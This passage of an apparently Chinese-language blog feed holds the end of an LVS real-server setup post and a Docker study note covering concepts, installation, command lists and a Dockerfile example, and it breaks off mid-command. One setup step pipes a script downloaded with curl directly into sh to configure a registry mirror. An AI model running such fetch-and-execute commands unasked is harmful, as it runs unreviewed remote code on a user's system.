&#x4E5F;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;ipvsadm -S# ipvsadm -S</code></pre><p><strong>&#x914D;&#x7F6E;Real Server</strong>  </p><pre><code class="bash">#!/bin/baship_addr=`ip a | grep &quot;\&lt;inet\&gt;&quot; | grep -v &quot;127.0.0.1&quot; | tr &apos;/&apos; &apos; &apos; | awk &apos;{print $2}&apos; | head -1`sed -i &apos;s/GATEWAY=*.*.*.*/GATEWAY=192.168.110.15/g&apos; /etc/sysconfig/network-scripts/ifcfg-ens33/etc/init.d/network restartyum install -y httpdecho $ip_addr &gt; /var/www/html/index.htmlsystemctl restart httpd</code></pre><h2 id="&#x53C2;&#x8003;&#x94FE;&#x63A5;"><a href="#&#x53C2;&#x8003;&#x94FE;&#x63A5;" class="headerlink" title="&#x53C2;&#x8003;&#x94FE;&#x63A5;"></a>&#x53C2;&#x8003;&#x94FE;&#x63A5;</h2><p><a href="https://blog.51cto.com/hellocjq/2090214" target="_blank" rel="noopener">lvs_nat &#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x6A21;&#x5F0F;&#x53CA;&#x6293;&#x5305;&#x5206;&#x6790;</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;LVS&amp;#x76F8;&amp;#x5173;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;LVS&amp;#x662F;Linux Virtual Server&amp;#x7684;&amp;#x7B80;&amp;#x5199;&amp;#xFF0C;&amp;#x610F;&amp;#x5373;Linux&amp;#x865A;&amp;
      
    
    </summary>
    
    
      <category term="LVS" scheme="https://marnm.github.io/tags/LVS/"/>
    
  </entry>
  
  <entry>
    <title>Docker学习笔记</title>
    <link href="https://marnm.github.io//posts/4a3d459a/"/>
    <id>https://marnm.github.io//posts/4a3d459a/</id>
    <published>2022-06-07T05:26:19.000Z</published>
    <updated>2022-09-02T18:58:17.759Z</updated>
    
    <content type="html"><![CDATA[<h1 id="&#x5BB9;&#x5668;Docker&#x8BE6;&#x89E3;"><a href="#&#x5BB9;&#x5668;Docker&#x8BE6;&#x89E3;" class="headerlink" title="&#x5BB9;&#x5668;Docker&#x8BE6;&#x89E3;"></a>&#x5BB9;&#x5668;Docker&#x8BE6;&#x89E3;</h1><h2 id="&#x6982;&#x8FF0;"><a href="#&#x6982;&#x8FF0;" class="headerlink" title="&#x6982;&#x8FF0;"></a>&#x6982;&#x8FF0;</h2><p><strong>1.1 &#x57FA;&#x672C;&#x6982;&#x5FF5;&#xFF1A;</strong></p><p>Docker&#x662F;&#x4E00;&#x4E2A;&#x5F00;&#x6E90;&#x7684;&#x5E94;&#x7528;&#x5BB9;&#x5668;&#x5F15;&#x64CE;&#xFF0C;&#x57FA;&#x4E8E;Go&#x8BED;&#x8A00; &#x5E76;&#x9075;&#x4ECE;Apache2.0&#x534F;&#x8BAE;&#x5F00;&#x6E90;&#x3002;Docker&#x53EF;&#x4EE5;&#x8BA9;&#x5F00;&#x53D1;&#x8005;&#x6253;&#x5305;&#x4ED6;&#x4EEC;&#x7684;&#x5E94;&#x7528;&#x4EE5;&#x53CA;&#x4F9D;&#x8D56;&#x5305;&#x5230;&#x4E00;&#x4E2A;&#x8F7B;&#x91CF;&#x7EA7;&#x3001;&#x53EF;&#x79FB;&#x690D;&#x7684;&#x5BB9;&#x5668;&#x4E2D;&#xFF0C;&#x7136;&#x540E;&#x53D1;&#x5E03;&#x5230;&#x4EFB;&#x4F55;&#x6D41;&#x884C;&#x7684;Linux&#x673A;&#x5668;&#x4E0A;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x5B9E;&#x73B0;&#x865A;&#x62DF;&#x5316;&#x3002;&#x5BB9;&#x5668;&#x662F;&#x5B8C;&#x5168;&#x4F7F;&#x7528;&#x6C99;&#x7BB1;&#x673A;&#x5236;&#xFF0C;&#x76F8;&#x4E92;&#x4E4B;&#x95F4;&#x4E0D;&#x4F1A;&#x6709;&#x4EFB;&#x4F55;&#x63A5;&#x53E3;&#xFF08;&#x7C7B;&#x4F3C;iPhone&#x7684;app&#xFF09;&#xFF0C;&#x66F4;&#x91CD;&#x8981;&#x7684;&#x7684;&#x662F;&#x5BB9;&#x5668;&#x6027;&#x80FD;&#x5F00;&#x9500;&#x6781;&#x4F4E;&#x3002;<br><a id="more"></a><br><strong>1.2 &#x4F18;&#x52BF;&#xFF1A;</strong></p><p>Docker&#x8BA9;&#x5F00;&#x53D1;&#x8005;&#x53EF;&#x4EE5;&#x6253;&#x5305;&#x4ED6;&#x4EEC;&#x7684;&#x5E94;&#x7528;&#x4EE5;&#x53CA;&#x4F9D;&#x8D56;&#x5305;&#x5230;&#x4E00;&#x4E2A;&#x53EF;&#x79FB;&#x690D;&#x7684;&#x5BB9;&#x5668;&#x4E2D;&#xFF0C;&#x7136;&#x540E;&#x53D1;&#x5E03;&#x5230;&#x4EFB;&#x4F55;&#x6D41;&#x884C;&#x7684;Linux&#x673A;&#x5668;&#x4E0A;&#xFF0C;&#x4FBF;&#x53EF;&#x4EE5;&#x5B9E;&#x73B0;&#x865A;&#x62DF;&#x5316;&#x3002;Docker&#x6539;&#x53D8;&#x4E86;&#x865A;&#x62DF;&#x5316;&#x7684;&#x65B9;&#x5F0F;&#xFF0C;&#x4F7F;&#x5F00;&#x53D1;&#x8005;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x5C06;&#x81EA;&#x5DF1;&#x7684;&#x6210;&#x679C;&#x653E;&#x5165;Docker&#x4E2D;&#x8FDB;&#x884C;&#x7BA1;&#x7406;&#x3002;&#x65B9;&#x4FBF;&#x5FEB;&#x6377;&#x5DF2;&#x7ECF;&#x662F;Docker&#x7684;&#x6700;&#x5927;&#x4F18;&#x52BF;&#xFF0C;&#x8FC7;&#x53BB;&#x9700;&#x8981;&#x7528;&#x6570;&#x5929;&#x4E43;&#x81F3;&#x6570;&#x5468;&#x7684;&#x4EFB;&#x52A1;&#xFF0C;&#x5728;Docker&#x5BB9;&#x5668;&#x7684;&#x5904;&#x7406;&#x4E0B;&#xFF0C;&#x53EA;&#x9700;&#x8981;&#x6570;&#x79D2;&#x5C31;&#x80FD;&#x5B8C;&#x6210;&#x3002;</p><p>&#x8282;&#x7701;&#x5F00;&#x652F;&#xFF1A;<br>&#x4E00;&#x65B9;&#x9762;&#xFF0C;&#x4E91;&#x8BA1;&#x7B97;&#x65F6;&#x4EE3;&#x5230;&#x6765;&#xFF0C;&#x4F7F;&#x5F00;&#x53D1;&#x8005;&#x4E0D;&#x5FC5;&#x4E3A;&#x4E86;&#x8FFD;&#x6C42;&#x6548;&#x679C;&#x800C;&#x914D;&#x7F6E;&#x9AD8;&#x989D;&#x7684;&#x786C;&#x4EF6;&#xFF0C;Docker&#x6539;&#x53D8;&#x4E86;&#x9AD8;&#x6027;&#x80FD;&#x5FC5;&#x7136;&#x9AD8;&#x4EF7;&#x683C;&#x7684;&#x601D;&#x7EF4;&#x5B9A;&#x52BF;&#x3002;Docker&#x4E0E;&#x4E91;&#x7684;&#x7ED3;&#x5408;&#xFF0C;&#x8BA9;&#x4E91;&#x7A7A;&#x95F4;&#x5F97;&#x5230;&#x66F4;&#x5145;&#x5206;&#x7684;&#x5229;&#x7528;&#x3002;&#x4E0D;&#x4EC5;&#x89E3;&#x51B3;&#x4E86;&#x786C;&#x4EF6;&#x7BA1;&#x7406;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x4E5F;&#x6539;&#x53D8;&#x4E86;&#x865A;&#x62DF;&#x5316;&#x7684;&#x65B9;&#x5F0F;&#x3002;</p><p><strong>1.3 &#x4E0E;&#x4F20;&#x7EDF;VM&#x7279;&#x6027;&#x5BF9;&#x6BD4;&#xFF1A;</strong></p><p>&#x4F5C;&#x4E3A;&#x4E00;&#x79CD;&#x8F7B;&#x91CF;&#x7EA7;&#x7684;&#x865A;&#x62DF;&#x5316;&#x65B9;&#x5F0F;&#xFF0C;Docker&#x5728;&#x8FD0;&#x884C;&#x5E94;&#x7528;&#x4E0A;&#x8DDF;&#x4F20;&#x7EDF;&#x7684;&#x865A;&#x62DF;&#x673A;&#x65B9;&#x5F0F;&#x76F8;&#x6BD4;&#x5177;&#x6709;&#x663E;&#x8457;&#x7684;&#x4F18;&#x52BF;&#xFF1A;<br>Docker&#x5BB9;&#x5668;&#x5F88;&#x5FEB;&#xFF0C;&#x542F;&#x52A8;&#x548C;&#x505C;&#x6B62;&#x53EF;&#x4EE5;&#x5728;&#x6570;&#x79D2;&#x7EA7;&#x5B9E;&#x73B0;&#xFF0C;&#x8FD9;&#x76F8;&#x6BD4;&#x4F20;&#x7EDF;&#x7684;&#x865A;&#x62DF;&#x673A;&#x65B9;&#x5F0F;&#x8981;&#x5FEB;&#x5F97;&#x591A;&#x3002;<br>Docker&#x5BB9;&#x5668;&#x5BF9;&#x7CFB;&#x7EDF;&#x8D44;&#x6E90;&#x9700;&#x6C42;&#x5F88;&#x5C11;&#xFF0C;&#x4E00;&#x53F0;&#x4E3B;&#x673A;&#x4E0A;&#x53EF;&#x4EE5;&#x540C;&#x65F6;&#x8FD0;&#x884C;&#x6570;&#x5343;&#x4E2A;Docker&#x5BB9;&#x5668;&#x3002;<br>Docker&#x901A;&#x8FC7;&#x7C7B;&#x4F3C;Git&#x7684;&#x64CD;&#x4F5C;&#x6765;&#x65B9;&#x4FBF;&#x7528;&#x6237;&#x83B7;&#x53D6;&#x3001;&#x5206;&#x652F;&#x548C;&#x66F4;&#x65B0;&#x5E94;&#x7528;&#x955C;&#x50CF;&#xFF0C;&#x6307;&#x4EE4;&#x7B80;&#x660E;&#xFF0C;&#x5B66;&#x4E60;&#x6210;&#x672C;&#x8F83;&#x4F4E;&#x3002;<br>Docker&#x901A;&#x8FC7;Dockerfile&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x6765;&#x652F;&#x6301;&#x7075;&#x6D3B;&#x7684;&#x81EA;&#x52A8;&#x5316;&#x521B;&#x5EFA;&#x548C;&#x90E8;&#x7F72;&#x673A;&#x5236;&#xFF0C;&#x63D0;&#x9AD8;&#x5DE5;&#x4F5C;&#x6548;&#x7387;&#x3002;<br>Docker&#x5BB9;&#x5668;&#x9664;&#x4E86;&#x8FD0;&#x884C;&#x5176;&#x4E2D;&#x7684;&#x5E94;&#x7528;&#x4E4B;&#x5916;&#xFF0C;&#x57FA;&#x672C;&#x4E0D;&#x6D88;&#x8017;&#x989D;&#x5916;&#x7684;&#x7CFB;&#x7EDF;&#x8D44;&#x6E90;&#xFF0C;&#x4FDD;&#x8BC1;&#x5E94;&#x7528;&#x6027;&#x80FD;&#x7684;&#x540C;&#x65F6;&#xFF0C;&#x5C3D;&#x91CF;&#x51CF;&#x5C0F;&#x7CFB;&#x7EDF;&#x5F00;&#x9500;&#x3002;<br>Docker&#x5229;&#x7528;Linux&#x7CFB;&#x7EDF;&#x4E0A;&#x7684;&#x591A;&#x79CD;&#x9632;&#x62A4;&#x673A;&#x5236;&#x5B9E;&#x73B0;&#x4E86;&#x4E25;&#x683C;&#x53EF;&#x9760;&#x7684;&#x9694;&#x79BB;&#x3002;&#x4ECE;1.3&#x7248;&#x672C;&#x5F00;&#x59CB;&#xFF0C;Docker&#x5F15;&#x5165;&#x4E86;&#x5B89;&#x5168;&#x9009;&#x9879;&#x548C;&#x955C;&#x50CF;&#x7B7E;&#x540D;&#x673A;&#x5236;&#xFF0C;&#x6781;&#x5927;&#x5730;&#x63D0;&#x9AD8;&#x4E86;&#x4F7F;&#x7528;Docker&#x7684;&#x5B89;&#x5168;&#x6027;&#x3002;  </p><table><thead><tr><th>&#x7279;&#x6027;</th><th>&#x5BB9;&#x5668;</th><th>&#x865A;&#x62DF;&#x673A;</th></tr></thead><tbody><tr><td>&#x542F;&#x52A8;&#x901F;&#x5EA6;</td><td>&#x79D2;&#x7EA7;</td><td>&#x5206;&#x949F;&#x7EA7;</td></tr><tr><td>&#x786C;&#x76D8;&#x4F7F;&#x7528;</td><td>&#x4E00;&#x822C;&#x4E3A;MB</td><td>&#x4E00;&#x822C;&#x7ED9;GB</td></tr><tr><td>&#x6027;&#x80FD;</td><td>&#x63A5;&#x8FD1;&#x539F;&#x751F;</td><td>&#x5F31;&#x4E8E;&#x539F;&#x751F;</td></tr><tr><td>&#x7CFB;&#x7EDF;&#x652F;&#x6301;&#x91CF;</td><td>&#x5355;&#x673A;&#x652F;&#x6301;&#x4E0A;&#x5343;&#x4E2A;&#x5BB9;&#x5668;</td><td>&#x4E00;&#x822C;&#x51E0;&#x5341;&#x4E2A;</td></tr><tr><td>&#x9694;&#x79BB;&#x6027;</td><td>&#x5B89;&#x5168;&#x9694;&#x79BB;</td><td>&#x5B89;&#x5168;&#x9694;&#x79BB;</td></tr></tbody></table><p><strong>1.4 &#x57FA;&#x7840;&#x67B6;&#x6784;</strong></p><p>Docker&#x4F7F;&#x7528;&#x5BA2;&#x6237;&#x7AEF;-&#x670D;&#x52A1;&#x5668;(C/S)&#x67B6;&#x6784;&#x6A21;&#x5F0F;&#xFF0C;&#x4F7F;&#x7528;&#x8FDC;&#x7A0B;API&#x6765;&#x7BA1;&#x7406;&#x548C;&#x521B;&#x5EFA;Docker&#x5BB9;&#x5668;&#x3002;</p><p>Docker&#x5BB9;&#x5668;&#x901A;&#x8FC7;Docker&#x955C;&#x50CF;&#x6765;&#x521B;&#x5EFA;</p><p>&#x5BB9;&#x5668;&#x4E0E;&#x955C;&#x50CF;&#x7684;&#x5173;&#x7CFB;&#x7C7B;&#x4F3C;&#x4E8E;&#x9762;&#x5411;&#x5BF9;&#x8C61;&#x7F16;&#x7A0B;&#x4E2D;&#x7684;&#x5BF9;&#x8C61;&#x4E0E;&#x7C7B;&#x3002;</p><table><thead><tr><th>Docker</th><th>&#x9762;&#x5411;&#x5BF9;&#x8C61;</th></tr></thead><tbody><tr><td>&#x5BB9;&#x5668;</td><td>&#x5BF9;&#x8C61;</td></tr><tr><td>&#x955C;&#x50CF;</td><td>&#x7C7B;</td></tr></tbody></table><p><img src=".png" alt=""></p><p><strong>1.5 Docker&#x6280;&#x672F;&#x7684;&#x57FA;&#x7840;&#xFF1A;</strong></p><ul><li>namespace&#xFF0C; &#x5BB9;&#x5668;&#x9694;&#x79BB;&#x7684;&#x57FA;&#x7840;&#xFF0C;&#x4FDD;&#x8BC1;A&#x5BB9;&#x5668;&#x770B;&#x4E0D;&#x5230;B&#x5BB9;&#x5668;&#x3002;6&#x4E2A;&#x547D;&#x540D;&#x7A7A;&#x95F4;&#xFF1A;User, Mnt, Network, UTS, IPC, PID</li><li>cgroups, &#x5BB9;&#x5668;&#x8D44;&#x6E90;&#x7EDF;&#x8BA1;&#x548C;&#x9694;&#x79BB;&#x3002;&#x4E3B;&#x8981;&#x7528;&#x5230;&#x7684;cgroups&#x5B50;&#x7CFB;&#x7EDF;&#xFF1A;CPU, blkio, device, freezer, memory</li><li>unionfs&#xFF0C; &#x5178;&#x578B;&#xFF1A;aufs/overlayfs&#xFF0C;&#x5206;&#x5C42;&#x955C;&#x50CF;&#x5B9E;&#x73B0;&#x7684;&#x57FA;&#x7840;</li></ul><p><strong>1.6 Docker&#x7EC4;&#x4EF6;&#xFF1A;</strong></p><ul><li>docker Client&#x5BA2;&#x6237;&#x7AEF;&#x2014;&#x2014;&#x2014;&#x2014;&gt;&#x5411;docker&#x670D;&#x52A1;&#x5668;&#x8FDB;&#x7A0B;&#x53D1;&#x8D77;&#x8BF7;&#x6C42;&#xFF0C;&#x5982;&#x521B;&#x5EFA;&#x3001;&#x505C;&#x6B62;&#x3001;&#x9500;&#x6BC1;&#x5BB9;&#x5668;&#x7B49;&#x64CD;&#x4F5C;</li><li>docker Server&#x670D;&#x52A1;&#x5668;&#x8FDB;&#x7A0B;&#x2014;&#x2014;&#x2014;&#x2014;&gt;&#x5904;&#x7406;&#x6240;&#x6709;docker&#x7684;&#x8BF7;&#x6C42;&#xFF0C;&#x7BA1;&#x7406;&#x6240;&#x6709;&#x5BB9;&#x5668;</li><li>docker Registry&#x955C;&#x50CF;&#x4ED3;&#x5E93;&#x2014;&#x2014;&#x2014;&#x2014;&gt;&#x955C;&#x50CF;&#x5B58;&#x653E;&#x7684;&#x4E2D;&#x592E;&#x4ED3;&#x5E93;&#xFF0C;&#x53EF;&#x770B;&#x4F5C;&#x662F;&#x5B58;&#x653E;&#x4E8C;&#x8FDB;&#x5236;&#x7684;scm</li></ul><h2 id="&#x4E8C;&#x3001;&#x5B89;&#x88C5;&#x90E8;&#x7F72;"><a href="#&#x4E8C;&#x3001;&#x5B89;&#x88C5;&#x90E8;&#x7F72;" class="headerlink" title="&#x4E8C;&#x3001;&#x5B89;&#x88C5;&#x90E8;&#x7F72;"></a>&#x4E8C;&#x3001;&#x5B89;&#x88C5;&#x90E8;&#x7F72;</h2><p><strong>2.1 &#x51C6;&#x5907;&#x6761;&#x4EF6;</strong></p><p>&#x76EE;&#x524D;&#xFF0C;CentOS&#x4EC5;&#x53D1;&#x884C;&#x7248;&#x672C;&#x4E2D;&#x7684;&#x5185;&#x6838;&#x652F;&#x6301;Docker&#x3002;<br>Docker&#x8FD0;&#x884C;&#x5728;CentOS 7&#x4E0A;&#xFF0C;&#x8981;&#x6C42;&#x7CFB;&#x7EDF;&#x4E3A;64&#x4F4D;&#x3001;&#x7CFB;&#x7EDF;&#x5185;&#x6838;&#x7248;&#x672C;&#x4E3A;3.10&#x4EE5;&#x4E0A;&#x3002;<br>Docker&#x8FD0;&#x884C;&#x5728;CentOS-6.5&#x6216;&#x66F4;&#x9AD8;&#x7684;&#x7248;&#x672C;&#x7684;CentOS&#x4E0A;&#xFF0C;&#x8981;&#x6C42;&#x7CFB;&#x7EDF;&#x4E3A;64&#x4F4D;&#x3001;&#x7CFB;&#x7EDF;&#x5185;&#x6838;&#x7248;&#x672C;2.6.32-431&#x6216;&#x8005;&#x66F4;&#x9AD8;&#x7248;&#x672C;</p><p><strong>2.2 &#x5B89;&#x88C5;docker</strong></p><pre><code class="shell">yum install docker -ysystemctl start dockersystemctl enable docker</code></pre><p><strong>2.3 &#x57FA;&#x672C;&#x547D;&#x4EE4;</strong></p><pre><code class="dockerfile">docker search centos    # &#x641C;&#x7D22;&#x955C;&#x50CF;</code></pre><p>&#x9ED8;&#x8BA4;&#x4ECE;&#x56FD;&#x5916;&#x62C9;&#x53D6;&#xFF0C;&#x901F;&#x5EA6;&#x5F88;&#x6162;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;daocloud&#x914D;&#x7F6E;&#x52A0;&#x901F;</p><pre><code class="shell"># &#x811A;&#x672C;&#x5199;&#x5165;curl -sSL https://get.daocloud.io/daotools/set_mirror.sh | sh -s http://d6f11267.m.daocloud.ioecho &quot;{\&quot;registry-mirrors\&quot;: [\&quot;http://d6f11267.m.daocloud.io\&quot;]}&quot;&gt; /etc/docker/daemon.jsonsystemctl restart docker  # &#x91CD;&#x542F;&#x751F;&#x6548;</code></pre><p>&#x6839;&#x636E;&#x9700;&#x6C42;&#x62C9;&#x53D6;&#x955C;&#x50CF;</p><pre><code>docker pull docker.io/ansible/centos7-ansible</code></pre><p>&#x62C9;&#x53D6;search&#x5230;&#x7684;&#x5168;&#x90E8;&#x955C;&#x50CF;  </p><pre><code class="shell">for i in `docker search centos | awk &apos;!/NAME/{print $2}&apos;`; do docker pull $i; done</code></pre><p>&#x67E5;&#x770B;&#x672C;&#x5730;&#x955C;&#x50CF;</p><pre><code>docker images</code></pre><p><strong>2.4 &#x547D;&#x4EE4;&#x6574;&#x7406;</strong></p><p>&#x5BB9;&#x5668;&#x64CD;&#x4F5C;&#xFF1A;</p><pre><code class="shell">docker create    # &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x5BB9;&#x5668;&#x4F46;&#x662F;&#x4E0D;&#x542F;&#x52A8;docker run       # &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x5BB9;&#x5668;&#x5E76;&#x542F;&#x52A8;docker stop      # &#x505C;&#x6B62;&#x5BB9;&#x5668;&#x8FD0;&#x884C;&#xFF0C;&#x53D1;&#x9001;&#x4FE1;&#x53F7;SIGTERMdocker start     # &#x542F;&#x52A8;&#x4E00;&#x4E2A;&#x505C;&#x6B62;&#x72B6;&#x6001;&#x7684;&#x5BB9;&#x5668;docker rm        # &#x5220;&#x9664;&#x4E00;&#x4E2A;&#x5BB9;&#x5668;docker kill      # &#x53D1;&#x9001;&#x4FE1;&#x53F7;&#x7ED9;&#x5BB9;&#x5668;&#xFF0C;&#x9ED8;&#x8BA4;SIGKILLdocker attach    # &#x8FDE;&#x63A5;&#xFF08;&#x8FDB;&#x5165;&#xFF09;&#x5230;&#x4E00;&#x4E2A;&#x6B63;&#x5728;&#x8FD0;&#x884C;&#x7684;&#x5BB9;&#x5668;docker wait      # &#x963B;&#x585E;&#x4E00;&#x4E2A;&#x5BB9;&#x5668;&#xFF0C;&#x77E5;&#x9053;&#x5BB9;&#x5668;&#x505C;&#x6B62;&#x8FD0;&#x884C;</code></pre><p>&#x83B7;&#x53D6;&#x5BB9;&#x5668;&#x4FE1;&#x606F;&#xFF1A;  </p><pre><code class="shell">docker ps        # &#x663E;&#x793A;&#x72B6;&#x6001;&#x4E3A;&#x8FD0;&#x884C;&#xFF08;up&#xFF09;&#x7684;&#x5BB9;&#x5668;docker ps -a     # &#x663E;&#x793A;&#x6240;&#x6709;&#x5BB9;&#x5668;&#xFF0C;&#x5305;&#x62EC;&#x8FD0;&#x884C;&#x4E2D;(up)&#x7684;&#x548C;&#x9000;&#x51FA;&#x7684;(exited&#xFF09;docker inspect   # &#x6DF1;&#x5165;&#x5BB9;&#x5668;&#x5185;&#x90E8;&#x83B7;&#x53D6;&#x5BB9;&#x5668;&#x6240;&#x6709;&#x4FE1;&#x606F;docker logs      # &#x67E5;&#x770B;&#x5BB9;&#x5668;&#x65E5;&#x5FD7;(stdout/stderr)docker events    # &#x5F97;&#x5230;docker&#x670D;&#x52A1;&#x5668;&#x7684;&#x5B9E;&#x65F6;&#x4E8B;&#x4EF6;docker port      # &#x663E;&#x793A;&#x5BB9;&#x5668;&#x7684;&#x7AEF;&#x53E3;&#x6620;&#x5C04;docker top       # &#x663E;&#x793A;&#x5BB9;&#x5668;&#x7684;&#x8FDB;&#x7A0B;&#x4FE1;&#x606F;docker diff      # &#x663E;&#x793A;&#x5BB9;&#x5668;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x7684;&#x524D;&#x540E;&#x53D8;&#x5316;</code></pre><p>&#x5BFC;&#x51FA;&#x5BB9;&#x5668;&#xFF1A;</p><pre><code class="shell">docker cp # &#x4ECE;&#x5BB9;&#x5668;&#x91CC;&#x5411;&#x5916;&#x62F7;&#x8D1D;&#x6587;&#x4EF6;&#x6216;&#x76EE;&#x5F55;docker export # &#x5C06;&#x5BB9;&#x5668;&#x6574;&#x4E2A;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x5BFC;&#x51FA;&#x4E00;&#x4E2A;tar&#x5305;&#xFF0C;&#x4E0D;&#x5E26;layers&#x3001;tag&#x7B49;&#x4FE1;&#x606F;</code></pre><p>&#x6267;&#x884C;&#xFF1A;</p><pre><code>docker exec  # &#x5728;&#x5BB9;&#x5668;&#x91CC;&#x6267;&#x884C;&#x4E00;&#x4E2A;&#x547D;&#x4EE4;&#xFF0C;&#x53EF;&#x4EE5;&#x6267;&#x884C;bash&#x8FDB;&#x5165;&#x4EA4;&#x4E92;&#x5F0F;</code></pre><p>&#x955C;&#x50CF;&#x64CD;&#x4F5C;&#xFF1A;</p><pre><code class="shell">docker images    # &#x663E;&#x793A;&#x672C;&#x5730;&#x6240;&#x6709;&#x7684;&#x955C;&#x50CF;&#x5217;&#x8868;docker import    # &#x4ECE;&#x4E00;&#x4E2A;tar&#x5305;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x955C;&#x50CF;&#xFF0C;&#x5F80;&#x5F80;&#x548C;export&#x7ED3;&#x5408;&#x4F7F;&#x7528;docker build     # &#x4F7F;&#x7528;Dockerfile&#x521B;&#x5EFA;&#x955C;&#x50CF;&#xFF08;&#x63A8;&#x8350;&#xFF09;docker commit    # &#x4ECE;&#x5BB9;&#x5668;&#x521B;&#x5EFA;&#x955C;&#x50CF;docker rmi       # &#x5220;&#x9664;&#x4E00;&#x4E2A;&#x955C;&#x50CF;docker load      # &#x4ECE;&#x4E00;&#x4E2A;tar&#x5305;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x955C;&#x50CF;&#xFF0C;&#x548C;save&#x914D;&#x5408;&#x4F7F;&#x7528;docker history   # &#x5C06;&#x4E00;&#x4E2A;&#x955C;&#x50CF;&#x4FDD;&#x5B58;&#x4E3A;&#x4E00;&#x4E2A;tar&#xFF0C;&#x5E26;layers&#x548C;tag&#x4FE1;&#x606F;docker history   # &#x663E;&#x793A;&#x751F;&#x6210;&#x4E00;&#x4E2A;&#x955C;&#x50CF;&#x7684;&#x5386;&#x53F2;&#x547D;&#x4EE4;docker tag       # &#x4E3A;&#x955C;&#x50CF;&#x8D77;&#x4E00;&#x4E2A;&#x522B;&#x540D;</code></pre><p>&#x955C;&#x50CF;&#x4ED3;&#x5E93;&#xFF08;registry&#xFF09;&#x64CD;&#x4F5C;&#xFF1A;</p><pre><code class="shell">docker login    # &#x767B;&#x5F55;&#x5230;&#x4E00;&#x4E2A;registrydocker search   # &#x4ECE;registry&#x4ED3;&#x5E93;&#x641C;&#x7D22;&#x955C;&#x50CF;docker pull     # &#x4ECE;&#x4ED3;&#x5E93;&#x4E0B;&#x8F7D;&#x955C;&#x50CF;&#x5230;&#x672C;&#x5730;docker push     # &#x5C06;&#x4E00;&#x4E2A;&#x955C;&#x50CF;push&#x5230;registry&#x4ED3;&#x5E93;&#x4E2D;</code></pre><p><strong>2.5 &#x7B80;&#x5355;&#x5B9E;&#x8DF5;&#x64CD;&#x4F5C;</strong></p><p>&#x8FD0;&#x884C;&#x5E76;&#x8FDB;&#x5165;&#x5BB9;&#x5668;&#x64CD;&#x4F5C;&#xFF1A;</p><pre><code class="dockerfile">docker run -i -t docker.io/1832990/centos6.5 /bin/bash</code></pre><ul><li>-t&#x8868;&#x793A;&#x5728;&#x65B0;&#x5BB9;&#x5668;&#x5185;&#x6307;&#x5B9A;&#x4E00;&#x4E2A;&#x4F2A;&#x7EC8;&#x7AEF;&#x6216;&#x7EC8;&#x7AEF;</li><li>-i&#x8868;&#x793A;&#x5141;&#x8BB8;&#x6211;&#x4EEC;&#x5BF9;&#x5BB9;&#x5668;&#x5185;&#x7684;(STDIN)&#x8FDB;&#x884C;&#x4EA4;&#x4E92;</li><li>-d&#x8868;&#x793A;&#x5C06;&#x5BB9;&#x5668;&#x5728;&#x540E;&#x53F0;&#x8FD0;&#x884C;&#xFF1B;</li><li>/bin/bash&#x5728;&#x5BB9;&#x5668;&#x5185;&#x542F;&#x52A8;bash shell</li></ul><p>&#x6240;&#x4EE5;&#x5F53;&#x5BB9;&#x5668;&#xFF08;container&#xFF09;&#x542F;&#x52A8;&#x4E4B;&#x540E;&#xFF0C;&#x6211;&#x4EEC;&#x4F1A;&#x83B7;&#x53D6;&#x5230;&#x4E00;&#x4E2A;&#x547D;&#x4EE4;&#x63D0;&#x793A;&#x7B26;&#xFF1A;</p><p>&#x5728;&#x5BB9;&#x5668;&#x5185;&#x6211;&#x4EEC;&#x5B89;&#x88C5;mysql&#x5E76;&#x8BBE;&#x7F6E;&#x5F00;&#x673A;&#x81EA;&#x542F;&#x52A8;&#xFF0C;&#x5C06;&#x4FEE;&#x6539;&#x540E;&#x7684;&#x955C;&#x50CF;&#x63D0;&#x4EA4;&#xFF1A;</p><pre><code>docker ps -l  #&#x67E5;&#x8BE2;&#x5BB9;&#x5668;IDdocker commit -m &quot;&#x529F;&#x80FD;&quot; -a &quot;&#x7528;&#x6237;&#x4FE1;&#x606F;&quot; ID tag  #&#x63D0;&#x4EA4;&#x4FEE;&#x6539;&#x540E;&#x7684;&#x955C;&#x50CF;</code></pre><pre><code class="shell">docker inspect ID    # &#x67E5;&#x770B;&#x8BE6;&#x7EC6;&#x4FE1;&#x606F;docker push ID     # &#x4E0A;&#x4F20;docker&#x955C;&#x50CF;</code></pre><p><strong>&#x5229;&#x7528;DockerFile&#x521B;&#x5EFA;&#x955C;&#x50CF;</strong><br>&#x4F7F;&#x7528;docker  build&#xFF0C;&#x9700;&#x8981;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;dockerfile&#x6587;&#x4EF6;&#xFF0C;&#x5176;&#x4E2D;&#x5305;&#x542B;&#x4E00;&#x7EC4;&#x6307;&#x4EE4;&#x6765;&#x544A;&#x8BC9;docker&#x5982;&#x4F55;&#x6784;&#x5EFA;&#x955C;&#x50CF;</p><pre><code class="bash">mkdir DockerFilecd DockerFilecat &gt; Dockerfile &lt;&lt;EOFFROM 603dd3515fccMAINTAINER Dcoker xuelRUN yum install mysql mysql-server -yRUN mkdir /etc/sysconfig/networkRUN /etc/init.d/mysqld startEOF</code></pre><pre><code>docker build -t &quot;centos6.8:mysqld&quot; 